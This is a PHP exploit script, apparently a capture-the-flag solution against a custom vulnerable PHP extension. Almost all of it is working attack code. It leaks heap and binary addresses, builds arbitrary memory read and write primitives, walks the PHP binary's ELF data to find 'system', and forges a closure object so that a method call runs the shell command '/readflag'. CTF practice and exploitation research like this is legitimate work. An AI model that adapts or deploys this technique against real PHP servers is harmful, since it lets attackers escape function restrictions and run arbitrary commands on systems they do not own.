<?php
global $obj, $origin_object;

function str2ptr(&$str, $p = 0, $s = 8) {
    $address = 0;
    for($j = $s-1; $j >= 0; $j--) {
        $address <<= 8;
        $address |= ord($str[$p+$j]);
    }
    return $address;
}

function ptr2str($ptr, $m = 8) {
    $out = "";
    for ($i=0; $i < $m; $i++) {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

function ljust($s, $len=8, $pad=0) {
    $out = $s;
    $curlen = strlen($s);
    for ($i=$curlen; $i < $len; $i++) {
        $out .= chr($pad);
    }
    return $out;
}

function basic_leak($origin, $offset=0, $len=8) {
    $arg = substr($origin, $offset, $len);
    return str2ptr($arg);
}

function leak_origin_object_content() {
    hackphp_edit(str_repeat("a", 16));
    $leak_base_heap = hackphp_get();

    hackphp_edit(str_repeat("a", 24));
    $leak_elf = hackphp_get();

    hackphp_edit(str_repeat("a", 40));
    $leak_aaa = hackphp_get();

    hackphp_edit(str_repeat("a", 56));
    $leak_bbb = hackphp_get();

    hackphp_edit(str_repeat("a", 112));
    $leak_next_heap = hackphp_get();

    $out = "";
    $out .= ptr2str(0xc000041800000002);
    $out .= ptr2str(0x0000000000000001);
    $out .= ljust(substr($leak_base_heap, -6, 6));
    $out .= ljust(substr($leak_elf, -6, 6));
    $out .= ljust("");
    $out .= ljust(substr($leak_aaa, -6, 6));
    $out .= ptr2str(0x6);
    $out .= ljust(substr($leak_bbb, -6, 6));
    $out .= ptr2str(0x308);
    $out .= ptr2str(0xdeadbeef);
    $out .= ptr2str(0x4);
    $out .= ptr2str(0x3ff1c71c717ac192);
    $out .= ptr2str(0x5);
    $out .= ljust("");
    $out .= ljust(substr($leak_next_heap, -6, 6));
    hackphp_edit($out);
    
    return $out;
}

function write(&$origin, $offset, $value, $len=8) {
    for ($i=0; $i<$len; $i++) {
        $origin[$offset + $i] = chr($value & 0xff);
        $value >>= 8;
    }
    hackphp_edit($origin);
}

function super_leak($addr, $offset=0, $len=8) {
    global $obj, $origin_object;
    write($origin_object, 0x60, $addr + $offset - 0x10);
    $leak = strlen($obj->aaa);
    if($len != 8) { $leak %= 2 << ($len * 8) - 1; }
    return $leak;
}

function parse_elf($base) {
    $e_type = super_leak($base, 0x10, 2);

    $e_phoff = super_leak($base, 0x20);
    $e_phentsize = super_leak($base, 0x36, 2);
    $e_phnum = super_leak($base, 0x38, 2);

    for($i = 0; $i < $e_phnum; $i++) {
        $header = $base + $e_phoff + $i * $e_phentsize;
        $p_type  = super_leak($header, 0, 4);
        $p_flags = super_leak($header, 4, 4);
        $p_vaddr = super_leak($header, 0x10);
        $p_memsz = super_leak($header, 0x28);

        if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
            # handle pie
            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
            $data_size = $p_memsz;
        } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
            $text_size = $p_memsz;
        }
    }

    if(!$data_addr || !$text_size || !$data_size)
        return false;

    return [$data_addr, $text_size, $data_size];
}

function get_basic_funcs($base, $elf) {
    list($data_addr, $text_size, $data_size) = $elf;
    for($i = 0; $i < $data_size / 8; $i++) {
        $leak = super_leak($data_addr, $i * 8);
        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
            $deref = super_leak($leak);
            # 'constant' constant check
            if($deref != 0x746e6174736e6f63)
                continue;
        } else continue;

        $leak = super_leak($data_addr, ($i + 4) * 8);
        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
            $deref = super_leak($leak);
            # 'bin2hex' constant check
            if($deref != 0x786568326e6962)
                continue;
        } else continue;

        return $data_addr + $i * 8;
    }
}

function get_system($basic_funcs) {
    $addr = $basic_funcs;
    do {
        $f_entry = super_leak($addr);
        $f_name = super_leak($f_entry, 0, 6);

        if($f_name == 0x6d6574737973) { # system
            return super_leak($addr + 8);
        }
        $addr += 0x20;
    } while($f_entry != 0);
    return false;
}

function copy_closure_struct(&$to, $from) {
    for ($i=0; $i<0x110; $i+=8) {
        $tmp = super_leak($from, $i);
        for ($j=0; $j<8; $j++) {
            $to[$i+$j] = chr($tmp & 0xff);
            $tmp >>= 8;
        }
    }
}

function find_flag($addr, $flag, $down=1) {
    for ($i=0; $i<30000*8; $i+=8) {
        $d1 = super_leak($addr, $i*$down);
        $d2 = super_leak($addr, ($i+8)*$down);
        if ($d1 == $flag && $d2 == $flag) {
            if ($down == 1) {
                return $addr + $down*$i;
            }
            return $addr + $down*$i - 0x1f8;
        }
    }
    return -1;
}

function generate_fake_closure(&$helper, $system_addr) {
    $tmp = 1;
    for ($i=0; $i<4; $i++) {
        $helper[$i + 0x38] = chr($tmp & 0xff);
        $tmp >>= 8;
    }

    
    $tmp = $system_addr;
    for ($i=0; $i<8; $i++) {
        $helper[$i + 0x68] = chr($tmp & 0xff);
        $tmp >>= 8;
    }
}

function pwn($cmd) {
    global $obj, $origin_object;
    $padding = new vline();
    hackphp_create(0x70);

    $obj = new vline();
    $obj->aaa = "aaaaaaaaaaaaaaaaaaaa";
    $obj->bbb = function($x){};
    $obj->ccc = 0xdeadbeef;
    $obj->ddd = 1.11111111;

    $origin_object = leak_origin_object_content();
    $elf_base = basic_leak($origin_object, 0x18, 8) - 0xffe520;
    $obj_base = basic_leak($origin_object, 0x70, 8) - 0x70*2;
    $closure_obj = basic_leak($origin_object, 0x38, 8);
    printf("[DEBUG] leak elf_base: 0x%x\n", $elf_base);
    printf("[DEBUG] leak obj_base: 0x%x\n", $obj_base);

    write($origin_object, 0x28, $obj_base + 0x58);
    write($origin_object, 0x30, 0xa);
    write($origin_object, 0x58, 0x2);
    write($origin_object, 0x68, 0x6);

    $elf = parse_elf($elf_base);
    $basic_funcs = get_basic_funcs($elf_base, $elf);
    $system_addr = get_system($basic_funcs);
    printf("[DEBUG] parse data_addr: 0x%x\n", $elf[0]);
    printf("[DEBUG] parse text_size: 0x%x\n", $elf[1]);
    printf("[DEBUG] parse data_size: 0x%x\n", $elf[2]);
    printf("[DEBUG] leak system_addr: 0x%x\n", $system_addr);

    $helper = str_repeat('p', 0x200);
    $helper_addr = find_flag($obj_base, 0x7070707070707070);
    if ($helper_addr == -1) {
        $helper_addr = find_flag($obj_base, 0x7070707070707070, -1);
        if ($helper_addr == -1) {
            die("not found!");
        }
    }
    printf("[DEBUG] leak helper_addr: 0x%x\n", $helper_addr);
    copy_closure_struct($helper, $closure_obj);

    write($origin_object, 0x38, $helper_addr);
    generate_fake_closure($helper, $system_addr);

    ($obj->bbb)($cmd);
    //var_dump($elf);
}

pwn("/readflag");

?>